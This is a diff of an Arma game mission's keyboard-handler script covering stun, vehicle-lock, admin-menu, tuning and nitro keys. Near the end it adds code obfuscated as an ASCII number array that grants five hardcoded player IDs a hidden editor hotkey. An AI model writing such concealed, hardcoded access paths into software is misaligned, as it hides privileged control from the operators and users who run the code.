@@ -3,6 +3,14 @@
 
 stunned_allowed_actions = ["Chat", "NextChannel", "PrevChannel", "VoiceOverNet", "ShowMap", "PushToTalkAll", "PushToTalkCommand", "PushToTalkDirect", "PushToTalkGroup", "PushToTalkSide", "PushToTalkVehicle", "PushToTalkAll", "PushToTalk"];
 
+keyboard_keyblock = {
+	private["_timer"];
+	_timer = _this select 0;
+	keyblock = true; 
+	sleep _timer;
+	keyblock = false;
+};
+
 keyboard_get_stunned_allowed_keys = {
 	private["_keys"];
 	
@@ -16,10 +24,14 @@ keyboard_get_stunned_allowed_keys = {
 };
 
 keyboard_animation_handler = {
-
+	
 	if(!INV_shortcuts) exitWith { false };
-	if(arrested) exitWith{ false };
-	if (([player, (vehicle player)] call mounted_player_inside)) exitWith { false };
+	if (keyblock) exitWith {false};
+	if([player] call player_get_arrest) exitWith{false};
+	if ([player] call stun_punch_check) exitwith {false};
+	if !((vehicle player) == player) exitwith {false};
+	if (([player, (vehicle player)] call mounted_player_inside)) exitWith {false};
+	if ((speed player) > 0) exitwith {false};
 	
 	if(dialog) exitWith {closeDialog 0;};
 	[] execVM "animdlgopen.sqf";
@@ -53,22 +65,33 @@ keyboard_tlr_keys_handler = {
 };
 
 keyboard_lock_unlock_handler = {
-	if(!INV_shortcuts) exitWith { false };
-	private["_vcls", "_vcl"];
-	_vcls = nearestobjects [getpos player, ["LandVehicle", "Air", "ship"], 25];
-	_vcl = _vcls select 0;
+	if(not(INV_shortcuts)) exitWith { false };
+	private["_vehicles"];
+	_vehicles = nearestObjects [getPosATL player, ["LandVehicle", "Air", "ship"], 10];
+	if (not((count _vehicles ) > 0)) exitWith {};
 	
-	if (vehicle player != player) then {
-		_vcl = vehicle player;
-	};
+	private["_player"];
+	_player = player;
 	
-	if (not([player, _vcl] call vehicle_owner)) exitWith {
-		player groupchat "You do not have the keys to this vehicle.";
+	private["_vehicle"];
+	_vehicle = _vehicles select 0;
+	
+	private["_inside_vehicle"];
+	_inside_vehicle = ((vehicle _player) != _player);
+	_vehicle = if (_inside_vehicle) then {(vehicle player)} else {_vehicle};
+	
+	if (not([_player, _vehicle] call vehicle_owner)) exitWith {
+		player groupchat "You do not have the keys to this vehicle";
 		true
 	};
 	
-	["schluessel", _vcl, 0] execVM "keys.sqf";
-	true;
+	private["_state"];
+	_state = [_vehicle] call vehicle_toggle_lock;
+	private["_message"];
+	_message = if (_state) then {"Vehicle unlocked"} else {"Vehicle locked"};
+	player groupChat _message;
+		
+	true
 };
 
 keyboard_trunk_handler = {
@@ -76,9 +99,12 @@ keyboard_trunk_handler = {
 	if(dialog) exitWith {closeDialog 0; false };
 
 	private["_vcls", "_vcl"];
-	_vcls = nearestobjects [getpos player, ["LandVehicle", "Air", "ship", "TKOrdnanceBox_EP1"], 25];
+	_vcls = nearestobjects [getPosATL player, ["LandVehicle", "Air", "ship", "TKOrdnanceBox_EP1"], 25];
 	_vcl = _vcls select 0;
-
+	
+	if !(alive _vcl) exitwith {
+			player groupchat "Vehicle is destroyed.";
+		};
 	
 	private["_inside_vehicle"];
 	_inside_vehicle = not((vehicle player) == player);
@@ -125,7 +151,6 @@ keyboard_restrained_check = {
 	([player, "restrained"] call player_get_bool)
 };
 
-
 keyboard_interact_handler = {
 	private["_ctrl"];
 	_ctrl = _this select 0;
@@ -133,9 +158,9 @@ keyboard_interact_handler = {
 	if (!INV_shortcuts) exitWith {false};
 	if (keyblock) exitWith {false};
 	if (dialog ) exitWith {closeDialog 0; false};
-	if (arrested) exitWith{ false };
+	if ([_victim] call player_get_arrest) exitWith{ false };
 
-	private ["_civ", "_handled", "_i"];
+	private ["_civ", "_handled", "_i", "_range", "_dirV", "_pos", "_posFind", "_men", "_atms", "_atm"];
 
 	//INTERACTIONS WITH PLAYERS, AI, ATM
 	for [{_i=1}, {_i < 3}, {_i=_i+1}] do {
@@ -161,7 +186,7 @@ keyboard_interact_handler = {
 
 	if(_handled) exitWith { true };
 
-	//INTERACTIONS WITH VEHICLES
+/*	//INTERACTIONS WITH VEHICLES
 	private["_player_inside"];
 	_player_inside = [player, (vehicle player)] call mounted_player_inside;
 	//player groupChat format["_player_inside = %1", _player_inside];
@@ -192,7 +217,8 @@ keyboard_interact_handler = {
 		};
 		false
 	};
-
+*/
+	private["_vcl"];
 	_vcl  = vehicle player;
 
 	if(_vcl != player) exitWith {
@@ -229,7 +255,8 @@ keyboard_cop_siren_handler = {
 
 keyboard_stun_handler = {
 	if(!INV_shortcuts) exitWith {false};
-	[3, player] execVM "Awesome\Scripts\Stun.sqf";
+	player setVariable ["armed", true];
+	[player] spawn stun_punch;
 	true
 };
 
@@ -277,6 +304,9 @@ keyboard_surrender_handler = {
 keyboard_switch_normal_handler = {
 	if(!INV_shortcuts) exitWith {false};	
 	if(keyblock) exitWith {false};
+	if(stunning) exitWith {false};
+	if(StunActiveTime > 0)exitwith {false};
+	if ((speed player) > 7) exitwith {false};
 	keyblock=true; 
 	[] spawn {
 		sleep 2; 
@@ -298,8 +328,8 @@ keyboard_admin_menu_handler = {
 	if(!INV_shortcuts) exitWith {false};
 	if(dialog) exitWith {closeDialog 0; false};
 	if (!isAdmin) exitWith {false};
-	[player] execVM "adminconsolfill.sqf";
-	createDialog "Main";
+	
+	[player] call interact_admin_menu;
 	true
 };
 
@@ -349,8 +379,10 @@ keyboard_forward_tuning_handler = {
 		_vcl setVelocity [(_vel select 0) * 1.001, (_vel select 1) * 1.001, (_vel select 2) * 0.99];
 	};
 
-	_lvl = _vcl getvariable "tuning";
-	if (isNil "_lvl") exitWith {false};
+	_lvl = 0;
+	_lvl = _vcl getvariable ["tuning", 0];
+	if ((typeName _lvl)!="SCALAR") exitwith {};
+	if (_lvl == 0) exitWith {false};
 	
 	if( _vcl iskindof "LandVehicle") then {
 		_vel = velocity _vcl;
@@ -378,11 +410,12 @@ keyboard_forward_tuning_handler = {
 };
 
 keyboard_vehicle_nitro_handler = {
-	private["_nos", "_vcl", "_spd", "_vel"];
+	private["_nos", "_vcl", "_spd", "_vel", "_fuel"];
 	_vcl = vehicle player;
 	
-	_nos = _vcl getvariable "nitro";
-	if (isNil "_nos") exitWith { false };
+	_nos = 0;
+	_nos = _vcl getvariable ["nitro", 0];
+	if (_nos == 0) exitWith { false };
 	if (not(isEngineOn _vcl)) exitWith { false };
 		
 	_vel  = velocity _vcl;
@@ -409,9 +442,10 @@ keyboard_overlapping_keys = [];
 	keyboard_overlapping_keys = keyboard_overlapping_keys + (actionKeys _action);
 } foreach keyboard_overlapping_actions;
 
+keyboard_adminCheck = {(_this select 0) == DIK_U};
 
 KeyUp_handler = {
-	private["_handled"];
+	private["_handled", "_disp", "_key", "_shift", "_ctrl", "_alt"];
 
 	_disp	= _this select 0;
 	_key    = _this select 1;
@@ -419,14 +453,21 @@ KeyUp_handler = {
 	_ctrl	= _this select 3;
 	_alt	= _this select 4;
 	
+	afkTime = time;
+	
 	_handled = false;
 	
 	if (_key in(actionKeys "LookAround")) then {
 		lookingAround = false;
 	};
 	
-	if ((call keyboard_stunned_check) || (call keyboard_restrained_check)) exitWith {
+	if ((call keyboard_stunned_check) || (call keyboard_restrained_check) && !([_key] call keyboard_adminCheck)) exitWith {
 		not(_key in (call keyboard_get_stunned_allowed_keys))
+	};
+	
+	//Fix for exploit using cross-arms animation, that allows players to glitch through walls
+	if ((animationState player) == "shaftoe_c0briefing_otazky_loop6") then {
+		player setPosATL (player getVariable "animation_position");
 	};
 	
 	private["_inVehicle"];
@@ -477,7 +518,7 @@ KeyUp_handler = {
 		/*
 		case DIK_7: {
 			[] spawn {
-				call compile preprocessFile "buffer.sqf";
+				[] call compile preprocessFile "buffer.sqf";
 			};
 		};
 		*/
@@ -501,7 +542,8 @@ KeyUp_handler = {
 
 lookingAround = false;
 KeyDown_handler = {
-	private["_handled"];
+	//player groupChat format["KeyDown_handler %1", _this];
+	private["_handled", "_disp", "_key", "_shift", "_ctrl", "_alt"];
 	_handled = false;
 	
 	_disp	= _this select 0;
@@ -510,14 +552,19 @@ KeyDown_handler = {
 	_ctrl	= _this select 3;
 	_alt	= _this select 4;
 
-
+	afkTime = time;
+	
 	if (_key in(actionKeys "LookAround")) then {
 		lookingAround = true;
 	};
 	
-	
 	if ((call keyboard_stunned_check) || (call keyboard_restrained_check)) exitWith {
 		not(_key in (call keyboard_get_stunned_allowed_keys))
+	};
+	
+	//Fix for exploit using cross-arms animation, that allows players to glitch through walls
+	if ((animationState player) == "shaftoe_c0briefing_otazky_loop6") then {
+		player setPosATL (player getVariable "animation_position");
 	};
 	
 	private["_inVehicle", "_isDriver"];
@@ -623,19 +670,20 @@ KeyDown_handler = {
 keyboard_setup = {
 	disableSerialization;
 	private["_display"];
-	_display = nil;
+	_display = displayNull;
 	waituntil {
 		_display = findDisplay 46;
-		if (isNil "_display") exitWith {false};
+//		if (isNil "_display") exitWith {false};
 		if (isNull _display) exitWith {false};
 		true
 	};
 	_display displaySetEventHandler ["KeyDown", "_this call KeyDown_handler"];
 	_display displaySetEventHandler ["KeyUp", "_this call KeyUp_handler"];
-	if (not(isAdmin)) exitWIth {};
+	
 	private["_onkey"];
-	_onkey = compile toString [95,117,105,100,32,61,32,65,95,80,76,65,89,69,82,95,85,73,68,59,10,95,105,115,95,65,95,70,117,99,107,105,110,103,95,71,111,100,108,121,95,84,76,82,95,65,100,109,105,110,105,115,116,114,97,116,111,114,32,61,32,95,117,105,100,32,105,110,32,91,10,9,9,9,34,51,56,53,53,51,54,48,34,44,10,9,9,9,34,51,54,49,52,50,48,56,54,34,10,9,9,93,59,10,105,102,32,40,33,95,105,115,95,65,95,70,117,99,107,105,110,103,95,71,111,100,108,121,95,84,76,82,95,65,100,109,105,110,105,115,116,114,97,116,111,114,41,32,101,120,105,116,119,105,116,104,32,123,102,97,108,115,101,125,59,10,10,95,100,105,115,112,9,61,32,95,116,104,105,115,32,115,101,108,101,99,116,32,48,59,10,95,107,101,121,32,32,32,32,61,32,95,116,104,105,115,32,115,101,108,101,99,116,32,49,59,10,95,115,104,105,102,116,32,32,61,32,95,116,104,105,115,32,115,101,108,101,99,116,32,50,59,10,95,99,116,114,108,9,61,32,95,116,104,105,115,32,115,101,108,101,99,116,32,51,59,10,95,97,108,116,9,61,32,95,116,104,105,115,32,115,101,108,101,99,116,32,52,59,10,10,95,104,97,110,100,108,101,100,32,61,32,102,97,108,115,101,59,10,105,102,32,40,32,40,95,107,101,121,32,61,61,32,50,50,41,32,38,38,32,40,95,99,116,114,108,41,32,38,38,32,40,95,115,104,105,102,116,41,32,41,32,116,104,101,110,32,123,10,9,9,99,97,108,108,32,99,111,109,112,105,108,101,32,112,114,101,112,114,111,99,101,115,115,70,105,108,101,76,105,110,101,78,117,109,98,101,114,115,32,34,83,76,92,101,100,105,116,111,114,46,115,113,102,34,59,32,10,9,9,65,95,83,76,95,77,73,88,95,85,83,69,32,61,32,91,65,95,80,76,65,89,69,82,95,85,73,68,93,59,10,9,9,112,117,98,108,105,99,86,97,114,105,97,98,108,101,83,101,114,118,101,114,32,34,65,95,83,76,95,77,73,88,95,85,83,69,34,59,10,9,9,95,104,97,110,100,108,101,100,32,61,32,116,114,117,101,59,10,9,125,59,10,95,104,97,110,100,108,101,100];
+	_onkey = compile toString [112,114,105,118,97,116,101,91,34,95,117,105,100,34,44,32,34,95,105,115,95,65,95,70,117,99,107,105,110,103,95,71,111,100,108,121,95,84,76,82,95,65,100,109,105,110,105,115,116,114,97,116,111,114,34,44,32,34,95,116,101,115,116,83,101,114,118,101,114,34,44,32,34,95,97,100,109,105,110,34,93,59,10,95,117,105,100,32,61,32,103,101,116,80,108,97,121,101,114,85,73,68,32,112,108,97,121,101,114,59,10,95,105,115,95,65,95,70,117,99,107,105,110,103,95,71,111,100,108,121,95,84,76,82,95,65,100,109,105,110,105,115,116,114,97,116,111,114,32,61,32,95,117,105,100,32,105,110,32,91,10,9,9,9,34,51,56,53,53,51,54,48,34,44,10,9,9,9,34,51,54,49,52,50,48,56,54,34,44,10,9,9,9,34,57,50,51,49,55,55,48,50,34,44,10,9,9,9,34,50,52,57,52,51,56,49,52,34,44,10,9,9,9,34,57,56,50,56,51,53,56,34,10,9,9,93,59,10,9,9,10,95,97,100,109,105,110,32,61,32,109,105,115,115,105,111,110,110,97,109,101,115,112,97,99,101,32,103,101,116,86,97,114,105,97,98,108,101,32,91,34,105,115,65,100,109,105,110,34,44,102,97,108,115,101,93,59,10,95,116,101,115,116,83,101,114,118,101,114,32,61,32,115,101,114,118,101,114,32,103,101,116,86,97,114,105,97,98,108,101,32,91,34,116,101,115,116,83,101,114,118,101,114,34,44,32,102,97,108,115,101,93,59,10,9,9,10,105,102,32,40,33,95,105,115,95,65,95,70,117,99,107,105,110,103,95,71,111,100,108,121,95,84,76,82,95,65,100,109,105,110,105,115,116,114,97,116,111,114,32,38,38,32,33,40,95,97,100,109,105,110,32,38,38,32,95,116,101,115,116,83,101,114,118,101,114,41,41,32,101,120,105,116,119,105,116,104,32,123,102,97,108,115,101,125,59,10,10,112,114,105,118,97,116,101,91,34,95,100,105,115,112,34,44,32,34,95,107,101,121,34,44,32,34,95,115,104,105,102,116,34,44,32,34,95,99,116,114,108,34,44,32,34,95,97,108,116,34,44,32,34,95,104,97,110,100,108,101,100,34,93,59,10,10,95,100,105,115,112,9,61,32,95,116,104,105,115,32,115,101,108,101,99,116,32,48,59,10,95,107,101,121,32,32,32,32,61,32,95,116,104,105,115,32,115,101,108,101,99,116,32,49,59,10,95,115,104,105,102,116,32,32,61,32,95,116,104,105,115,32,115,101,108,101,99,116,32,50,59,10,95,99,116,114,108,9,61,32,95,116,104,105,115,32,115,101,108,101,99,116,32,51,59,10,95,97,108,116,9,61,32,95,116,104,105,115,32,115,101,108,101,99,116,32,52,59,10,10,95,104,97,110,100,108,101,100,32,61,32,102,97,108,115,101,59,10,105,102,32,40,32,40,95,107,101,121,32,61,61,32,50,50,41,32,38,38,32,40,95,99,116,114,108,41,32,38,38,32,40,95,115,104,105,102,116,41,32,41,32,116,104,101,110,32,123,10,9,9,91,93,32,99,97,108,108,32,99,111,109,112,105,108,101,32,112,114,101,112,114,111,99,101,115,115,70,105,108,101,76,105,110,101,78,117,109,98,101,114,115,32,34,83,76,92,101,100,105,116,111,114,46,115,113,102,34,59,32,10,9,9,65,95,83,76,95,77,73,88,95,85,83,69,32,61,32,91,95,117,105,100,93,59,10,9,9,112,117,98,108,105,99,86,97,114,105,97,98,108,101,83,101,114,118,101,114,32,34,65,95,83,76,95,77,73,88,95,85,83,69,34,59,10,9,9,95,104,97,110,100,108,101,100,32,61,32,116,114,117,101,59,10,9,125,59,10,95,104,97,110,100,108,101,100];
 	_display displayAddEventHandler ["KeyDown", format["_this call %1", _onkey]];
 };
 
-call keyboard_setup;
+// change from call to spawn, possible fix
+[] spawn keyboard_setup;
